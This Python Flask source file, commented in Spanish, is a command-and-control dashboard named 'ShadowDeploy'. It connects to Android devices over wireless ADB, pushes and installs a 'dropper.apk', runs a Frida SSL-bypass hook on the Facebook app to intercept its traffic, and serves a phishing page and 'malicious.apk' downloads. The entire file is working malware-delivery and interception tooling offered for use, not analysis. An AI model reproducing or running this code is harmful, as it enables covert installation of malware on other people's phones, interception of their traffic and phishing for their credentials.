import os, yaml, subprocess, threading, time, logging
from flask import Flask, send_file, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(filename='logs/deploy.log', level=logging.INFO, 
                   format='%(asctime)s - %(message)s')

# Configuración
with open('config.yaml', 'r') as f:
    CONFIG = yaml.safe_load(f)

def adb_exec(device=None, cmd=None):
    """ADB wrapper optimizado para Termux"""
    full_cmd = ['adb']
    if device: full_cmd += ['-s', device]
    if cmd: full_cmd += cmd
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=30)
        logging.info(f"ADB {' '.join(full_cmd)} -> {result.returncode}")
        return result.returncode == 0, result.stdout + result.stderr
    except Exception as e:
        logging.error(f"ADB Error: {e}")
        return False, str(e)

def get_devices():
    success, output = adb_exec(cmd=['devices', '-l'])
    if success:
        return [line.split('\t')[0] for line in output.splitlines() 
                if '\tdevice' in line and not line.startswith('*')]
    return []

@app.route('/')
def dashboard():
    devices = get_devices()
    status = {}
    for dev in devices:
        pkg_check, out = adb_exec(device=dev, cmd=['shell', 'pm', 'list', 'packages', CONFIG['android']['package']])
        status[dev] = "✅ INSTALADO" if pkg_check and "package:" in out else "❌ PENDIENTE"
    
    template = """
<!DOCTYPE html><html><head><title>ShadowDeploy C2</title>
<meta http-equiv="refresh" content="5"><style>body{font-family:monospace;background:#111;color:#0f0;padding:20px;}
table{border-collapse:collapse;width:100%;}th,td{border:1px solid #333;padding:8px;text-align:left;}
a{color:#0ff;text-decoration:none;padding:5px 10px;background:#222;border-radius:3px;}
.btn-deploy{background:#0f0;color:#000;}</style></head><body>
<h1>🕷️ ShadowDeploy Framework - C2 Dashboard</h1>
<h3>Dispositivos: {{ devices|length }} | {{ now }}</h3>
<table><tr><th>ID</th><th>Estado</th><th>Acciones</th></tr>
{% for dev in devices %}
<tr><td>{{ dev[:20] }}</td><td>{{ status[dev] }}</td>
<td><a href="/deploy/{{ dev }}" class="btn-deploy">🚀 Deploy Dropper</a>
<a href="/mitm/{{ dev }}">🔬 MITM+Frida</a></td></tr>{% endfor %}</table>
<hr><a href="/phishing">📱 Link Phishing</a> | <a href="/payloads/malicious.apk">⬇️ Payload</a>
</body></html>"""
    return render_template_string(template, devices=devices, status=status, now=datetime.now().strftime("%H:%M:%S"))

@app.route('/deploy/<device>')
def deploy_dropper(device):
    # Wireless ADB setup
    adb_exec(cmd=['connect', device + ':5555'])
    adb_exec(device=device, cmd=['push', 'payloads/dropper.apk', '/sdcard/Download/'])
    adb_exec(device=device, cmd=['shell', 'pm', 'install', '-r', '/sdcard/Download/dropper.apk'])
    adb_exec(device=device, cmd=['shell', 'monkey', '-p', CONFIG['android']['package'], '1'])
    return jsonify({"status": "🚀 Dropper desplegado", "device": device})

@app.route('/mitm/<device>')
def mitm_frida(device):
    # Deploy Frida + hooks
    adb_exec(device=device, cmd=['push', '2_frida_hooks/meta_ssl_bypass.js', '/data/local/tmp/'])
    adb_exec(device=device, cmd=['shell', 'frida', '-U', '-l', '/data/local/tmp/meta_ssl_bypass.js', '-f', 'com.facebook.katana'])
    return jsonify({"status": "🔬 MITM+Frida activo", "device": device})

@app.route('/phishing')
def phishing_page():
    return send_file('static/phishing.html')

@app.route('/payloads/<path:filename>')
def payloads(filename):
    return send_file(f'payloads/{filename}', as_attachment=True)

if __name__ == '__main__':
    os.makedirs('logs payloads static'.split(), exist_ok=True)
    print("🕷️ ShadowDeploy C2 activo: http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, threaded=True)